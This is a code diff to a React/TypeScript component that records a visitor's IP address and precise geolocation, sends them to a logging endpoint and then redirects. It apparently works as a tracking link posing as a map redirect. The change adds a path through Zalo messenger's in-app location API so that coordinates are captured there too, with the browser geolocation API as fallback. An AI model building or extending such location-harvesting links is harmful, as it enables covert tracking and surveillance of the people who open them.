@@ -29,7 +29,7 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
         console.error("Could not fetch IP", e);
       }
 
-      const logDataAndRedirect = (pos?: GeolocationPosition) => {
+      const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
         const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'link' };
         if (pos) {
           body.lat = pos.coords.latitude;
@@ -47,18 +47,34 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
         });
       };
 
-      const handleError = (error: GeolocationPositionError) => {
-        if (error.code === error.PERMISSION_DENIED) {
+      const handleError = (error?: { code: number; message?: string }) => {
+        if (error?.code === 1) { // PERMISSION_DENIED
             setStatus('denied');
         } else {
             logDataAndRedirect();
         }
       };
-
-      if (navigator.geolocation) {
+      
+      // Check for Zalo's specific JS API first to fix ReferenceError and optimize
+      if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
+        (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
+            if (data.status === "SUCCESS" && data.latitude && data.longitude) {
+                logDataAndRedirect({
+                    coords: {
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        accuracy: data.accuracy || 15,
+                    },
+                });
+            } else {
+                handleError({ code: 1, message: 'Zalo API failed or was denied' });
+            }
+        });
+      }
+      else if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           logDataAndRedirect,
-          handleError,
+          (err) => handleError(err),
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
